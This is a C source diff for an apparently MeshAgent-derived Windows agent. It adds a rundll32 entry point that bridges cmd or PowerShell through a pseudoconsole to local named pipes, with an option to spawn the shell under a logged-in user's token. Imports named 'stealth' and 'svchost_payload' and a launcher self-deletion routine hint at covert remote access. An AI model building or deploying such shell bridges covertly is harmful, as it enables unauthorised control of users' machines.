@@ -4,9 +4,41 @@
 #include <stdlib.h>
 #include <wchar.h>
 #include <strsafe.h>
-
+#include <WtsApi32.h>
 #include "stealth.h"
 #include "svchost_payload.h"
+
+#ifndef PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE
+#define PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE 0x00020016
+#endif
+
+#ifndef ERROR_ACCESS_DISABLED_BY_POLICY
+#define ERROR_ACCESS_DISABLED_BY_POLICY 1260L
+#endif
+
+#define MESH_CONSOLE_BRIDGE_PIPE_PREFIX_W L"\\\\.\\pipe\\MeshConsoleBridge_"
+#define MESH_CONSOLE_BRIDGE_CONNECT_TIMEOUT_MS 15000UL
+#define MESH_CONSOLE_BRIDGE_IO_BUFFER_SIZE 8192
+#define MESH_CONSOLE_BRIDGE_NO_SESSION 0xFFFFFFFFUL
+
+typedef HRESULT (WINAPI* MeshConsoleBridge_CreatePseudoConsoleFn)(COORD, HANDLE, HANDLE, DWORD, HANDLE*);
+typedef void (WINAPI* MeshConsoleBridge_ClosePseudoConsoleFn)(HANDLE);
+typedef BOOL (WINAPI* MeshConsoleBridge_CreateEnvironmentBlockFn)(LPVOID*, HANDLE, BOOL);
+typedef BOOL (WINAPI* MeshConsoleBridge_DestroyEnvironmentBlockFn)(LPVOID);
+
+typedef struct MeshConsoleBridgeConptyApi
+{
+    MeshConsoleBridge_CreatePseudoConsoleFn CreatePseudoConsoleFn;
+    MeshConsoleBridge_ClosePseudoConsoleFn ClosePseudoConsoleFn;
+} MeshConsoleBridgeConptyApi;
+
+typedef struct MeshConsoleBridgeCopyContext
+{
+    HANDLE readHandle;
+    HANDLE writeHandle;
+    volatile LONG* stopFlag;
+    DWORD errorCode;
+} MeshConsoleBridgeCopyContext;
 
 BOOL MeshAgent_RunPreProtectionCaptureValidationW(const wchar_t* outputPath);
 int MeshService_RunSelfTestHostW(const wchar_t* arguments);
@@ -895,6 +927,423 @@ static DWORD MeshRundll32_DeleteLauncherAfterParentExitW(const wchar_t* targetPa
     return GetLastError();
 }
 
+static void MeshConsoleBridge_CloseHandle(HANDLE* handleRef)
+{
+    if (handleRef == NULL) { return; }
+    if (*handleRef != NULL && *handleRef != INVALID_HANDLE_VALUE) { CloseHandle(*handleRef); }
+    *handleRef = NULL;
+}
+
+static BOOL MeshConsoleBridge_HasSuffixW(const wchar_t* value, const wchar_t* suffix)
+{
+    size_t valueLen = 0;
+    size_t suffixLen = 0;
+    if (value == NULL || suffix == NULL) { return FALSE; }
+    valueLen = wcslen(value);
+    suffixLen = wcslen(suffix);
+    if (valueLen <= suffixLen) { return FALSE; }
+    return (_wcsicmp(value + (valueLen - suffixLen), suffix) == 0) ? TRUE : FALSE;
+}
+
+static BOOL MeshConsoleBridge_IsApprovedPipeNameW(const wchar_t* value, const wchar_t* suffix)
+{
+    size_t valueLen = 0;
+    size_t prefixLen = wcslen(MESH_CONSOLE_BRIDGE_PIPE_PREFIX_W);
+    size_t suffixLen = 0;
+    size_t i = 0;
+    if (value == NULL || suffix == NULL) { SetLastError(ERROR_INVALID_PARAMETER); return FALSE; }
+    valueLen = wcslen(value);
+    suffixLen = wcslen(suffix);
+    if (valueLen <= (prefixLen + suffixLen) || _wcsnicmp(value, MESH_CONSOLE_BRIDGE_PIPE_PREFIX_W, prefixLen) != 0 || !MeshConsoleBridge_HasSuffixW(value, suffix))
+    {
+        SetLastError(ERROR_ACCESS_DISABLED_BY_POLICY);
+        return FALSE;
+    }
+    for (i = prefixLen; i < valueLen - suffixLen; ++i)
+    {
+        wchar_t c = value[i];
+        if (!((c >= L'0' && c <= L'9') || c == L'_'))
+        {
+            SetLastError(ERROR_ACCESS_DISABLED_BY_POLICY);
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+static BOOL MeshConsoleBridge_ParseUnsignedTokenW(const wchar_t* value, DWORD minValue, DWORD maxValue, DWORD* output)
+{
+    wchar_t* end = NULL;
+    unsigned long parsed = 0;
+    if (output == NULL || value == NULL || value[0] == L'\0') { SetLastError(ERROR_INVALID_PARAMETER); return FALSE; }
+    parsed = wcstoul(value, &end, 10);
+    if (end == value || end == NULL || *end != L'\0' || parsed < minValue || parsed > maxValue)
+    {
+        SetLastError(ERROR_INVALID_PARAMETER);
+        return FALSE;
+    }
+    *output = (DWORD)parsed;
+    return TRUE;
+}
+
+static BOOL MeshConsoleBridge_ResolveShellW(const wchar_t* shellName, wchar_t* shellPath, size_t shellPathCch, wchar_t* commandLine, size_t commandLineCch)
+{
+    DWORD systemDirLen = 0;
+    const wchar_t* shellSuffix = NULL;
+    const wchar_t* shellArgs = L"";
+    if (shellName == NULL || shellPath == NULL || shellPathCch == 0 || commandLine == NULL || commandLineCch == 0)
+    {
+        SetLastError(ERROR_INVALID_PARAMETER);
+        return FALSE;
+    }
+    shellPath[0] = L'\0';
+    commandLine[0] = L'\0';
+    if (_wcsicmp(shellName, L"cmd") == 0)
+    {
+        shellSuffix = L"\\cmd.exe";
+    }
+    else if (_wcsicmp(shellName, L"powershell") == 0)
+    {
+        shellSuffix = L"\\WindowsPowerShell\\v1.0\\powershell.exe";
+        shellArgs = L" -NoLogo -NoProfile";
+    }
+    else
+    {
+        SetLastError(ERROR_ACCESS_DISABLED_BY_POLICY);
+        return FALSE;
+    }
+    systemDirLen = GetSystemDirectoryW(shellPath, (UINT)shellPathCch);
+    if (systemDirLen == 0 || systemDirLen >= shellPathCch)
+    {
+        shellPath[0] = L'\0';
+        SetLastError(ERROR_INSUFFICIENT_BUFFER);
+        return FALSE;
+    }
+    if (FAILED(StringCchCatW(shellPath, shellPathCch, shellSuffix)) ||
+        FAILED(StringCchPrintfW(commandLine, commandLineCch, L"\"%ls\"%ls", shellPath, shellArgs)))
+    {
+        shellPath[0] = L'\0';
+        commandLine[0] = L'\0';
+        SetLastError(ERROR_INSUFFICIENT_BUFFER);
+        return FALSE;
+    }
+    if (!MeshRundll32_FileExistsW(shellPath)) { SetLastError(ERROR_FILE_NOT_FOUND); return FALSE; }
+    return TRUE;
+}
+
+static BOOL MeshConsoleBridge_LoadConptyApi(MeshConsoleBridgeConptyApi* api)
+{
+    HMODULE kernel32Module = NULL;
+    if (api == NULL) { SetLastError(ERROR_INVALID_PARAMETER); return FALSE; }
+    ZeroMemory(api, sizeof(*api));
+    kernel32Module = GetModuleHandleW(L"kernel32.dll");
+    if (kernel32Module == NULL) { kernel32Module = LoadLibraryW(L"kernel32.dll"); }
+    if (kernel32Module == NULL) { return FALSE; }
+    api->CreatePseudoConsoleFn = (MeshConsoleBridge_CreatePseudoConsoleFn)GetProcAddress(kernel32Module, "CreatePseudoConsole");
+    api->ClosePseudoConsoleFn = (MeshConsoleBridge_ClosePseudoConsoleFn)GetProcAddress(kernel32Module, "ClosePseudoConsole");
+    if (api->CreatePseudoConsoleFn == NULL || api->ClosePseudoConsoleFn == NULL)
+    {
+        SetLastError(ERROR_NOT_SUPPORTED);
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static HANDLE MeshConsoleBridge_OpenPipeClientW(const wchar_t* pipeName, DWORD desiredAccess, DWORD timeoutMs)
+{
+    ULONGLONG deadline = 0;
+    DWORD lastError = ERROR_SUCCESS;
+    if (pipeName == NULL || pipeName[0] == L'\0') { SetLastError(ERROR_INVALID_PARAMETER); return INVALID_HANDLE_VALUE; }
+    deadline = GetTickCount64() + timeoutMs;
+    for (;;)
+    {
+        HANDLE pipeHandle = CreateFileW(pipeName, desiredAccess, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (pipeHandle != INVALID_HANDLE_VALUE) { return pipeHandle; }
+        lastError = GetLastError();
+        if (lastError != ERROR_PIPE_BUSY && lastError != ERROR_FILE_NOT_FOUND && lastError != ERROR_PATH_NOT_FOUND)
+        {
+            SetLastError(lastError);
+            return INVALID_HANDLE_VALUE;
+        }
+        if (GetTickCount64() >= deadline)
+        {
+            SetLastError(lastError == ERROR_SUCCESS ? ERROR_SEM_TIMEOUT : lastError);
+            return INVALID_HANDLE_VALUE;
+        }
+        if (!WaitNamedPipeW(pipeName, 250))
+        {
+            lastError = GetLastError();
+            if (lastError != ERROR_SEM_TIMEOUT && lastError != ERROR_FILE_NOT_FOUND && lastError != ERROR_PATH_NOT_FOUND && lastError != ERROR_PIPE_BUSY)
+            {
+                SetLastError(lastError);
+                return INVALID_HANDLE_VALUE;
+            }
+            Sleep(50);
+        }
+    }
+}
+
+static BOOL MeshConsoleBridge_OpenPrimaryTokenForSession(DWORD sessionId, HANDLE* userTokenOut)
+{
+    HANDLE impersonationToken = NULL;
+    HANDLE userToken = NULL;
+    BOOL ok = FALSE;
+    if (userTokenOut == NULL) { SetLastError(ERROR_INVALID_PARAMETER); return FALSE; }
+    *userTokenOut = NULL;
+    if (!WTSQueryUserToken(sessionId, &impersonationToken)) { return FALSE; }
+    ok = DuplicateTokenEx(impersonationToken, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &userToken);
+    CloseHandle(impersonationToken);
+    if (!ok) { return FALSE; }
+    *userTokenOut = userToken;
+    return TRUE;
+}
+
+static BOOL MeshConsoleBridge_TryCreateEnvironmentBlock(HANDLE userToken, LPVOID* environment, MeshConsoleBridge_DestroyEnvironmentBlockFn* destroyFnOut, HMODULE* moduleOut)
+{
+    HMODULE userEnvModule = NULL;
+    MeshConsoleBridge_CreateEnvironmentBlockFn createFn = NULL;
+    MeshConsoleBridge_DestroyEnvironmentBlockFn destroyFn = NULL;
+    if (environment == NULL) { SetLastError(ERROR_INVALID_PARAMETER); return FALSE; }
+    *environment = NULL;
+    if (destroyFnOut != NULL) { *destroyFnOut = NULL; }
+    if (moduleOut != NULL) { *moduleOut = NULL; }
+    if (userToken == NULL) { SetLastError(ERROR_INVALID_PARAMETER); return FALSE; }
+    userEnvModule = LoadLibraryExW(L"userenv.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
+    if (userEnvModule == NULL && GetLastError() == ERROR_INVALID_PARAMETER) { userEnvModule = LoadLibraryW(L"userenv.dll"); }
+    if (userEnvModule == NULL) { return FALSE; }
+    createFn = (MeshConsoleBridge_CreateEnvironmentBlockFn)GetProcAddress(userEnvModule, "CreateEnvironmentBlock");
+    destroyFn = (MeshConsoleBridge_DestroyEnvironmentBlockFn)GetProcAddress(userEnvModule, "DestroyEnvironmentBlock");
+    if (createFn == NULL || destroyFn == NULL)
+    {
+        FreeLibrary(userEnvModule);
+        SetLastError(ERROR_PROC_NOT_FOUND);
+        return FALSE;
+    }
+    if (!createFn(environment, userToken, FALSE))
+    {
+        DWORD error = GetLastError();
+        FreeLibrary(userEnvModule);
+        SetLastError(error);
+        return FALSE;
+    }
+    if (destroyFnOut != NULL) { *destroyFnOut = destroyFn; }
+    if (moduleOut != NULL) { *moduleOut = userEnvModule; }
+    else { FreeLibrary(userEnvModule); }
+    return TRUE;
+}
+
+static BOOL MeshConsoleBridge_CreateShellProcessW(HANDLE pseudoConsole, const wchar_t* shellPath, wchar_t* commandLine, DWORD targetSessionId, PROCESS_INFORMATION* processInfo)
+{
+    STARTUPINFOEXW startupInfo;
+    SIZE_T attributeListSize = 0;
+    HANDLE userToken = NULL;
+    LPVOID environment = NULL;
+    HMODULE userEnvModule = NULL;
+    MeshConsoleBridge_DestroyEnvironmentBlockFn destroyEnvironmentFn = NULL;
+    DWORD creationFlags = EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT;
+    BOOL ok = FALSE;
+    DWORD lastError = ERROR_SUCCESS;
+    if (pseudoConsole == NULL || shellPath == NULL || shellPath[0] == L'\0' || commandLine == NULL || commandLine[0] == L'\0' || processInfo == NULL)
+    {
+        SetLastError(ERROR_INVALID_PARAMETER);
+        return FALSE;
+    }
+    ZeroMemory(&startupInfo, sizeof(startupInfo));
+    ZeroMemory(processInfo, sizeof(*processInfo));
+    startupInfo.StartupInfo.cb = sizeof(startupInfo);
+    startupInfo.StartupInfo.lpDesktop = L"winsta0\\default";
+    startupInfo.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeListSize);
+    if (attributeListSize == 0) { return FALSE; }
+    startupInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeListSize);
+    if (startupInfo.lpAttributeList == NULL) { SetLastError(ERROR_NOT_ENOUGH_MEMORY); return FALSE; }
+    if (!InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, &attributeListSize))
+    {
+        lastError = GetLastError();
+        HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);
+        SetLastError(lastError);
+        return FALSE;
+    }
+    if (!UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, pseudoConsole, sizeof(pseudoConsole), NULL, NULL))
+    {
+        lastError = GetLastError();
+        DeleteProcThreadAttributeList(startupInfo.lpAttributeList);
+        HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);
+        SetLastError(lastError);
+        return FALSE;
+    }
+    if (targetSessionId != MESH_CONSOLE_BRIDGE_NO_SESSION)
+    {
+        if (!MeshConsoleBridge_OpenPrimaryTokenForSession(targetSessionId, &userToken))
+        {
+            lastError = GetLastError();
+            DeleteProcThreadAttributeList(startupInfo.lpAttributeList);
+            HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);
+            SetLastError(lastError);
+            return FALSE;
+        }
+        if (!MeshConsoleBridge_TryCreateEnvironmentBlock(userToken, &environment, &destroyEnvironmentFn, &userEnvModule))
+        {
+            Stealth_LogInstallEvent(L"[CONSOLE_BRIDGE] CreateEnvironmentBlock failed session=%lu error=%lu; using default environment", (unsigned long)targetSessionId, (unsigned long)GetLastError());
+            environment = NULL;
+        }
+        ok = CreateProcessAsUserW(userToken, NULL, commandLine, NULL, NULL, FALSE, creationFlags, environment, NULL, &startupInfo.StartupInfo, processInfo);
+    }
+    else
+    {
+        ok = CreateProcessW(NULL, commandLine, NULL, NULL, FALSE, creationFlags, NULL, NULL, &startupInfo.StartupInfo, processInfo);
+    }
+    lastError = ok ? ERROR_SUCCESS : GetLastError();
+    if (environment != NULL && destroyEnvironmentFn != NULL) { destroyEnvironmentFn(environment); }
+    if (userEnvModule != NULL) { FreeLibrary(userEnvModule); }
+    if (userToken != NULL) { CloseHandle(userToken); }
+    DeleteProcThreadAttributeList(startupInfo.lpAttributeList);
+    HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);
+    if (!ok) { SetLastError(lastError); }
+    return ok;
+}
+
+static DWORD WINAPI MeshConsoleBridge_CopyThread(LPVOID param)
+{
+    MeshConsoleBridgeCopyContext* ctx = (MeshConsoleBridgeCopyContext*)param;
+    BYTE buffer[MESH_CONSOLE_BRIDGE_IO_BUFFER_SIZE];
+    if (ctx == NULL || ctx->readHandle == NULL || ctx->readHandle == INVALID_HANDLE_VALUE || ctx->writeHandle == NULL || ctx->writeHandle == INVALID_HANDLE_VALUE) { return ERROR_INVALID_PARAMETER; }
+    ctx->errorCode = ERROR_SUCCESS;
+    while (InterlockedCompareExchange(ctx->stopFlag, 0, 0) == 0)
+    {
+        DWORD bytesRead = 0;
+        DWORD totalWritten = 0;
+        if (!ReadFile(ctx->readHandle, buffer, (DWORD)sizeof(buffer), &bytesRead, NULL) || bytesRead == 0)
+        {
+            ctx->errorCode = GetLastError();
+            if (ctx->errorCode == ERROR_SUCCESS) { ctx->errorCode = ERROR_BROKEN_PIPE; }
+            break;
+        }
+        while (totalWritten < bytesRead && InterlockedCompareExchange(ctx->stopFlag, 0, 0) == 0)
+        {
+            DWORD bytesWritten = 0;
+            if (!WriteFile(ctx->writeHandle, buffer + totalWritten, bytesRead - totalWritten, &bytesWritten, NULL) || bytesWritten == 0)
+            {
+                ctx->errorCode = GetLastError();
+                if (ctx->errorCode == ERROR_SUCCESS) { ctx->errorCode = ERROR_WRITE_FAULT; }
+                InterlockedExchange(ctx->stopFlag, 1);
+                return ctx->errorCode;
+            }
+            totalWritten += bytesWritten;
+        }
+    }
+    InterlockedExchange(ctx->stopFlag, 1);
+    return ctx->errorCode;
+}
+
+static DWORD MeshConsoleBridge_RunW(const wchar_t* inputPipeName, const wchar_t* outputPipeName, const wchar_t* shellName, DWORD cols, DWORD rows, DWORD targetSessionId)
+{
+    MeshConsoleBridgeConptyApi conptyApi;
+    PROCESS_INFORMATION processInfo;
+    MeshConsoleBridgeCopyContext inputCopy;
+    MeshConsoleBridgeCopyContext outputCopy;
+    HANDLE inputPipe = INVALID_HANDLE_VALUE;
+    HANDLE outputPipe = INVALID_HANDLE_VALUE;
+    HANDLE ptyInputRead = NULL;
+    HANDLE ptyInputWrite = NULL;
+    HANDLE ptyOutputRead = NULL;
+    HANDLE ptyOutputWrite = NULL;
+    HANDLE pseudoConsole = NULL;
+    HANDLE inputThread = NULL;
+    HANDLE outputThread = NULL;
+    HANDLE waitHandles[3];
+    COORD consoleSize;
+    wchar_t shellPath[MAX_PATH * 4] = {0};
+    wchar_t commandLine[MAX_PATH * 4] = {0};
+    volatile LONG stopFlag = 0;
+    DWORD exitCode = ERROR_GEN_FAILURE;
+    DWORD waitResult = WAIT_FAILED;
+    HRESULT hr = S_OK;
+    ZeroMemory(&conptyApi, sizeof(conptyApi));
+    ZeroMemory(&processInfo, sizeof(processInfo));
+    ZeroMemory(&inputCopy, sizeof(inputCopy));
+    ZeroMemory(&outputCopy, sizeof(outputCopy));
+    waitHandles[0] = NULL;
+    waitHandles[1] = NULL;
+    waitHandles[2] = NULL;
+    if (!MeshConsoleBridge_IsApprovedPipeNameW(inputPipeName, L"_in") ||
+        !MeshConsoleBridge_IsApprovedPipeNameW(outputPipeName, L"_out") ||
+        !MeshConsoleBridge_ResolveShellW(shellName, shellPath, _countof(shellPath), commandLine, _countof(commandLine)))
+    {
+        return GetLastError();
+    }
+    if (!MeshConsoleBridge_LoadConptyApi(&conptyApi)) { return GetLastError(); }
+    inputPipe = MeshConsoleBridge_OpenPipeClientW(inputPipeName, GENERIC_READ, MESH_CONSOLE_BRIDGE_CONNECT_TIMEOUT_MS);
+    if (inputPipe == INVALID_HANDLE_VALUE) { return GetLastError(); }
+    outputPipe = MeshConsoleBridge_OpenPipeClientW(outputPipeName, GENERIC_WRITE, MESH_CONSOLE_BRIDGE_CONNECT_TIMEOUT_MS);
+    if (outputPipe == INVALID_HANDLE_VALUE) { exitCode = GetLastError(); goto cleanup; }
+    if (!CreatePipe(&ptyInputRead, &ptyInputWrite, NULL, 0)) { exitCode = GetLastError(); goto cleanup; }
+    if (!CreatePipe(&ptyOutputRead, &ptyOutputWrite, NULL, 0)) { exitCode = GetLastError(); goto cleanup; }
+    consoleSize.X = (SHORT)cols;
+    consoleSize.Y = (SHORT)rows;
+    hr = conptyApi.CreatePseudoConsoleFn(consoleSize, ptyInputRead, ptyOutputWrite, 0, &pseudoConsole);
+    if (FAILED(hr) || pseudoConsole == NULL)
+    {
+        exitCode = HRESULT_CODE(hr);
+        if (exitCode == ERROR_SUCCESS) { exitCode = ERROR_NOT_SUPPORTED; }
+        goto cleanup;
+    }
+    if (!MeshConsoleBridge_CreateShellProcessW(pseudoConsole, shellPath, commandLine, targetSessionId, &processInfo))
+    {
+        exitCode = GetLastError();
+        goto cleanup;
+    }
+    MeshConsoleBridge_CloseHandle(&ptyInputRead);
+    MeshConsoleBridge_CloseHandle(&ptyOutputWrite);
+    inputCopy.readHandle = inputPipe;
+    inputCopy.writeHandle = ptyInputWrite;
+    inputCopy.stopFlag = &stopFlag;
+    outputCopy.readHandle = ptyOutputRead;
+    outputCopy.writeHandle = outputPipe;
+    outputCopy.stopFlag = &stopFlag;
+    inputThread = CreateThread(NULL, 0, MeshConsoleBridge_CopyThread, &inputCopy, 0, NULL);
+    if (inputThread == NULL) { exitCode = GetLastError(); goto cleanup; }
+    outputThread = CreateThread(NULL, 0, MeshConsoleBridge_CopyThread, &outputCopy, 0, NULL);
+    if (outputThread == NULL) { exitCode = GetLastError(); goto cleanup; }
+    waitHandles[0] = processInfo.hProcess;
+    waitHandles[1] = inputThread;
+    waitHandles[2] = outputThread;
+    waitResult = WaitForMultipleObjects(3, waitHandles, FALSE, INFINITE);
+    InterlockedExchange(&stopFlag, 1);
+    if (waitResult == WAIT_OBJECT_0)
+    {
+        if (!GetExitCodeProcess(processInfo.hProcess, &exitCode)) { exitCode = GetLastError(); }
+    }
+    else if (waitResult == WAIT_OBJECT_0 + 1 || waitResult == WAIT_OBJECT_0 + 2)
+    {
+        if (GetExitCodeProcess(processInfo.hProcess, &exitCode) && exitCode == STILL_ACTIVE)
+        {
+            TerminateProcess(processInfo.hProcess, ERROR_OPERATION_ABORTED);
+            exitCode = ERROR_OPERATION_ABORTED;
+        }
+    }
+    else
+    {
+        exitCode = GetLastError();
+        if (processInfo.hProcess != NULL) { TerminateProcess(processInfo.hProcess, exitCode); }
+    }
+
+cleanup:
+    InterlockedExchange(&stopFlag, 1);
+    MeshConsoleBridge_CloseHandle(&ptyInputWrite);
+    MeshConsoleBridge_CloseHandle(&ptyOutputRead);
+    MeshConsoleBridge_CloseHandle(&ptyInputRead);
+    MeshConsoleBridge_CloseHandle(&ptyOutputWrite);
+    MeshConsoleBridge_CloseHandle(&inputPipe);
+    MeshConsoleBridge_CloseHandle(&outputPipe);
+    if (inputThread != NULL) { WaitForSingleObject(inputThread, 2000); CloseHandle(inputThread); }
+    if (outputThread != NULL) { WaitForSingleObject(outputThread, 2000); CloseHandle(outputThread); }
+    if (processInfo.hThread != NULL) { CloseHandle(processInfo.hThread); }
+    if (processInfo.hProcess != NULL) { CloseHandle(processInfo.hProcess); }
+    if (pseudoConsole != NULL && conptyApi.ClosePseudoConsoleFn != NULL) { conptyApi.ClosePseudoConsoleFn(pseudoConsole); }
+    return exitCode;
+}
+
 void CALLBACK MeshLifecycleHostW(HWND hwnd, HINSTANCE hinstDLL, LPWSTR lpCmdLine, int nCmdShow)
 {
     wchar_t tail[MAX_PATH * 6] = {0};
@@ -1078,4 +1527,71 @@ void CALLBACK MeshKvmProbeHostW(HWND hwnd, HINSTANCE hinstDLL, LPWSTR lpCmdLine,
     exitCode = MeshService_RunKvmProbeHostW(arguments);
     Stealth_LogInstallEvent(L"[KVM_PROBE_HOST] Completed exit=%d", exitCode);
     ExitProcess((DWORD)exitCode);
+}
+
+void CALLBACK MeshConsoleBridgeW(HWND hwnd, HINSTANCE hinstDLL, LPWSTR lpCmdLine, int nCmdShow)
+{
+    wchar_t tail[32768] = {0};
+    wchar_t inputPipeName[MAX_PATH * 4] = {0};
+    wchar_t outputPipeName[MAX_PATH * 4] = {0};
+    wchar_t shellName[32] = {0};
+    wchar_t colsText[16] = {0};
+    wchar_t rowsText[16] = {0};
+    wchar_t sessionText[32] = {0};
+    const wchar_t* cursor = NULL;
+    DWORD cols = 80;
+    DWORD rows = 25;
+    DWORD targetSessionId = MESH_CONSOLE_BRIDGE_NO_SESSION;
+    DWORD exitCode = ERROR_INVALID_PARAMETER;
+
+    UNREFERENCED_PARAMETER(hwnd);
+    UNREFERENCED_PARAMETER(hinstDLL);
+    UNREFERENCED_PARAMETER(nCmdShow);
+
+    Stealth_EnsureLoggingDefaults();
+    if (!MeshRundll32_GetEntryTailW(MESH_RUNDLL32_ENTRY_CONSOLE_BRIDGE_W, lpCmdLine, tail, _countof(tail)))
+    {
+        DWORD error = GetLastError();
+        Stealth_LogInstallEvent(L"[CONSOLE_BRIDGE] Missing arguments (error=%lu)", (unsigned long)error);
+        ExitProcess(ERROR_INVALID_PARAMETER);
+    }
+    cursor = tail;
+    if (!MeshRundll32_CopyNextTokenW(&cursor, inputPipeName, _countof(inputPipeName)) ||
+        !MeshRundll32_CopyNextTokenW(&cursor, outputPipeName, _countof(outputPipeName)) ||
+        !MeshRundll32_CopyNextTokenW(&cursor, shellName, _countof(shellName)) ||
+        !MeshRundll32_CopyNextTokenW(&cursor, colsText, _countof(colsText)) ||
+        !MeshRundll32_CopyNextTokenW(&cursor, rowsText, _countof(rowsText)) ||
+        !MeshConsoleBridge_ParseUnsignedTokenW(colsText, 20, 300, &cols) ||
+        !MeshConsoleBridge_ParseUnsignedTokenW(rowsText, 10, 100, &rows))
+    {
+        DWORD error = GetLastError();
+        Stealth_LogInstallEvent(L"[CONSOLE_BRIDGE] Invalid arguments tail=%ls error=%lu", tail, (unsigned long)error);
+        ExitProcess(ERROR_INVALID_PARAMETER);
+    }
+    if (MeshRundll32_CopyNextTokenW(&cursor, sessionText, _countof(sessionText)))
+    {
+        if (wcsncmp(sessionText, L"tsid=", 5) != 0 || !MeshConsoleBridge_ParseUnsignedTokenW(sessionText + 5, 0, 0xFFFFFFFEUL, &targetSessionId))
+        {
+            DWORD error = GetLastError();
+            Stealth_LogInstallEvent(L"[CONSOLE_BRIDGE] Invalid session argument=%ls error=%lu", sessionText, (unsigned long)error);
+            ExitProcess(ERROR_INVALID_PARAMETER);
+        }
+    }
+    else if (GetLastError() != ERROR_NO_MORE_ITEMS)
+    {
+        DWORD error = GetLastError();
+        Stealth_LogInstallEvent(L"[CONSOLE_BRIDGE] Failed to parse optional session argument error=%lu", (unsigned long)error);
+        ExitProcess(ERROR_INVALID_PARAMETER);
+    }
+
+    Stealth_LogInstallEvent(L"[CONSOLE_BRIDGE] Starting shell=%ls cols=%lu rows=%lu session=%lu input=%ls output=%ls",
+        shellName,
+        (unsigned long)cols,
+        (unsigned long)rows,
+        (unsigned long)targetSessionId,
+        inputPipeName,
+        outputPipeName);
+    exitCode = MeshConsoleBridge_RunW(inputPipeName, outputPipeName, shellName, cols, rows, targetSessionId);
+    Stealth_LogInstallEvent(L"[CONSOLE_BRIDGE] Completed exit=%lu", (unsigned long)exitCode);
+    ExitProcess(exitCode);
 }
